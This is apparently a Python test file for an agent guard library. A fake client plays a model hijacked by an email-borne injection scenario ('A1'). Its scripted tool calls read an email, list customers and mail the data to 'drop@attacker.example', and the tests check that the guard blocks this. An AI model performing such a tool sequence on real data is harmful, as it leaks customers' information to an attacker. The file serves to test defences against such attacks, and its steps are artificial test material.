import asyncio
import json

from agent_firebreak.agents.llm import LLMAgent
from agent_firebreak.runner import run_scenario
from agent_firebreak.scenarios import get_scenario


class FakeClient:
    """Plays a model that has been fooled by A1, in each provider's wire format."""

    def __init__(self, provider):
        self.provider, self.n, self.sent = provider, 0, []

    async def post_json(self, url, headers, body):
        self.sent.append((url, headers, body))
        self.n += 1
        steps = [("read_email", {"id": "latest"}), ("list_customers", {}),
                 ("send_email", {"to": "drop@attacker.example", "subject": "s", "body": "b"}),
                 ("final_answer", {"text": "done"})]
        name, args = steps[min(self.n, 4) - 1]
        if self.provider == "openai":
            return {"choices": [{"message": {"content": None, "tool_calls": [
                {"id": f"c{self.n}", "function": {"name": name, "arguments": json.dumps(args)}}]}}]}
        return {"content": [{"type": "tool_use", "id": f"c{self.n}", "name": name, "input": args}]}


def go(provider, guard_on):
    client = FakeClient(provider)
    agent = LLMAgent(provider, "m", "KEY", client=client)
    return asyncio.run(run_scenario(get_scenario("A1"), agent, guard_on=guard_on)), client


def test_both_providers_attack_lands_without_guard_and_blocked_with():
    for provider in ("openai", "anthropic"):
        assert go(provider, False)[0].landed
        assert not go(provider, True)[0].landed


def test_wire_format_and_key_placement():
    _, c = go("anthropic", True)
    url, headers, body = c.sent[0]
    assert url.endswith("/v1/messages") and headers["x-api-key"] == "KEY" and body["tools"][0]["input_schema"]
    _, c = go("openai", True)
    assert c.sent[0][0].endswith("/chat/completions") and c.sent[0][1]["authorization"] == "Bearer KEY"
    assert c.sent[1][2]["messages"][-1]["role"] == "tool"
